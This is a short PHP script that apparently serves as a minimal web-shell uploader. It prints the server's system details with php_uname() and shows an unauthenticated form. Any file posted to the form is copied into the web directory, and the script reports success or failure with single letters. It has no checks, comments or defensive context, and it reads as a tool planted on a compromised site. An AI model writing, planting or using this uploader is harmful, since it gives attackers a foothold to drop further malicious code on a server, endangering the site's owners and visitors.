<?php
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="u" id="u">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="U"></form>';
if( $_POST['_upl'] == "U" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>S</b><br><br>'; }
else { echo '<b>G</b><br><br>'; }
}
?>